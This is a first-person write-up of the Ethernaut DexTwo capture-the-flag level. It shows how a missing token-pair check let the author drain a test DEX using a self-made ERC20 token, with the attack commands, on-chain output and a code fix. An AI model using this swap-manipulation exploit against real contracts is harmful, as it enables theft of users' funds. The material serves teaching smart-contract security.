> **âš ï¸ EDUCATIONAL PURPOSE ONLY**
> This document is part of the [Ethernaut CTF](https://ethernaut.openzeppelin.com/) educational security challenges.
> The techniques described here are for **authorized security testing and learning purposes only**.
> **DO NOT** use these methods on contracts you don't own or without explicit authorization.

---

# Level 23 - DEXTWO: How I Drained the DEX in 3 Swaps

## Initial Analysis

After solving the Dex challenge (Level 22) where I exploited a flawed price calculation through 6 carefully orchestrated swaps, I was eager to tackle DexTwo. The challenge description mentioned it was "subtly modified" and asked: "How has the swap method been modified?"

I immediately opened [DexTwo.sol](DexTwo.sol) and compared it with the previous Dex contract. The difference jumped out at me instantly at line 23:

```solidity
// Dex (Level 22) - Had this security check
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

// DexTwo (Level 23) - Missing the check!
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    // ... continues without validating tokens
}
```

**Eureka!** The contract no longer validates which tokens can be swapped. This meant I could swap ANY ERC20 token for token1 or token2!

## My Initial Strategy

I reasoned that if I could use my own malicious token (let's call it MAL), I could control both sides of the swap equation:

```
swapAmount = (amountIn * dexBalanceOutput) / dexBalanceInput
```

My initial plan was simple:
1. Deploy a malicious ERC20 token
2. Transfer 1 MAL to the DexTwo (to avoid division by zero)
3. Swap 1 MAL for token1 â†’ Should give me `(1 * 100) / 1 = 100` token1
4. Transfer 1 more MAL to DexTwo
5. Swap 1 MAL for token2 â†’ Should give me `(1 * 100) / 1 = 100` token2
6. Done! Both pools drained!

This seemed way simpler than the Level 22 exploit. Let me implement it!

## Implementation: First Attempt

I created two files:

**[MaliciousToken.sol](MaliciousToken.sol)** - A simple ERC20:
```solidity
contract MaliciousToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("MaliciousToken", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}
```

**[DexTwoAttackDirect.s.sol](../../script/levels/23_DexTwo/DexTwoAttackDirect.s.sol)** - My attack script following the plan above.

I ran the script:

```bash
forge script script/levels/23_DexTwo/DexTwoAttackDirect.s.sol:DexTwoAttackDirectScript \
  --rpc-url $SEPOLIA_RPC_URL --broadcast --legacy
```

## First Problem: Math Didn't Add Up!

The script compiled and ran, but the output surprised me:

```
[Step 4] Swapping 1 MAL for Token1...
Expected Token1 output: 100

--- After first swap (MAL -> Token1) ---
Player Token1: 110  âœ… Great!
DexTwo Token1: 0    âœ… Perfect!

[Step 5] Transferring 1 more MAL to DexTwo...
DexTwo MAL balance: 3  âš ï¸ Wait, what? Why 3?

[Step 6] Swapping 1 MAL for Token2...
Expected Token2 output: 33  âŒ Not 100!

--- After second swap (MAL -> Token2) ---
Player Token2: 43
DexTwo Token2: 67   âŒ Still has 67 token2!
```

**What went wrong?**

I had forgotten that during the swap, the DexTwo receives my MAL tokens via `transferFrom`! So the sequence was:
1. I transfer 1 MAL â†’ DexTwo has **1 MAL**
2. I swap 1 MAL â†’ DexTwo receives 1 more â†’ DexTwo has **2 MAL** (not 1!)
3. I transfer 1 MAL â†’ DexTwo has **3 MAL** (not 1!)
4. I swap 1 MAL â†’ Calculation becomes `(1 * 100) / 3 = 33` (not 100!)

My initial math was wrong because I didn't account for the `transferFrom` during swaps!

## Recalculating: The Manual Fix

The first swap had succeeded perfectly - I had drained all 100 token1. But I still had 67 token2 left in the DEX.

Let me check the current on-chain state:

```bash
cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN1 $DEXTWO_TARGET
# Result: 0 âœ…

cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN2 $DEXTWO_TARGET
# Result: 67 âŒ

cast call $MAL_TOKEN "balanceOf(address)" $DEXTWO_TARGET
# Result: 4
```

So the DexTwo currently has:
- 0 token1
- 67 token2
- 4 MAL

To drain the remaining 67 token2, I calculated:
```
(X * 67) / 4 = 67
Therefore: X = 4
```

I needed to swap exactly 4 MAL to get 67 token2!

Let me execute this manually:

```bash
cast send $DEXTWO_TARGET "swap(address,address,uint256)" \
  $MAL_TOKEN $TOKEN2 4 \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY \
  --legacy
```

Success! Transaction hash: `0xcbce5aee19147b046c8f6156ccdb6e31e6b25c55581b91ec6676c4b3f725191b`

## Verification: Complete Drainage Achieved!

Let me verify the final state:

```bash
# Check DexTwo balances
cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN1 $DEXTWO_TARGET
# Result: 0

cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN2 $DEXTWO_TARGET
# Result: 0

# Check my balances
cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN1 $PLAYER_ADDRESS
# Result: 110

cast call $DEXTWO_TARGET "balanceOf(address,address)" $TOKEN2 $PLAYER_ADDRESS
# Result: 110
```

ðŸŽ‰ **COMPLETE SUCCESS!**

**Final Result:**
- Started with: 10 token1 + 10 token2
- Ended with: 110 token1 + 110 token2
- DexTwo drained: 0 token1 + 0 token2
- **Profit: +100 token1 + +100 token2**

## What I Learned

This challenge taught me several valuable lessons:

1. **Account for State Changes**: When calculating attack sequences, always remember that each transaction changes the state. The DexTwo receives tokens during swaps, which I initially forgot.

2. **Simpler Can Be Deadlier**: Removing the token validation made this exploit WAY simpler than Level 22:
   - Level 22 (Dex): Required 6 swaps with precise calculations
   - Level 23 (DexTwo): Required 2-3 swaps with a custom token

3. **Input Validation Matters**: The single missing line `require((from == token1 && to == token2)...)` transformed a complex exploit into a trivial one.

4. **Manual Intervention is OK**: When my script had a calculation error, I didn't panic. I checked the on-chain state, recalculated what was needed, and finished the attack manually. Adaptability is key!

## The Actual Attack Flow

Here's what actually happened:

```
Initial State:
- Player: 10 T1, 10 T2, 10000 MAL
- DexTwo: 100 T1, 100 T2, 0 MAL

Step 1: Transfer 1 MAL to DexTwo
- DexTwo: 100 T1, 100 T2, 1 MAL

Step 2: Swap 1 MAL â†’ token1
Calculation: (1 * 100) / 1 = 100 T1
- Player: 110 T1, 10 T2
- DexTwo: 0 T1, 100 T2, 2 MAL (received 1 from swap!)

Step 3: Transfer 1 MAL to DexTwo
- DexTwo: 0 T1, 100 T2, 3 MAL

Step 4: Swap 1 MAL â†’ token2 (partial)
Calculation: (1 * 100) / 3 = 33 T2
- Player: 110 T1, 43 T2
- DexTwo: 0 T1, 67 T2, 4 MAL

Step 5: Swap 4 MAL â†’ token2 (complete drain)
Calculation: (4 * 67) / 4 = 67 T2
- Player: 110 T1, 110 T2 âœ…
- DexTwo: 0 T1, 0 T2, 8 MAL âœ…
```

## How to Fix This Vulnerability

The fix is straightforward - restore the token validation that was removed:

```solidity
function swap(address from, address to, uint256 amount) public {
    // Add this validation back!
    require(
        (from == token1 && to == token2) || (from == token2 && to == token1),
        "Invalid token pair"
    );

    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

Additionally, as recommended in Level 22, the price formula should be improved to use a proper constant product AMM formula to prevent price manipulation even for legitimate tokens.

## Conclusion

DexTwo demonstrated that sometimes the simplest vulnerabilities are the most devastating. By removing a single security check, the contract became trivially exploitable. What required 6 carefully calculated swaps in Level 22 became a simple 2-3 swap attack with a custom token.

The key insight: **in smart contract security, every line of code matters, especially the ones you remove**.

**Challenge completed!** âœ…
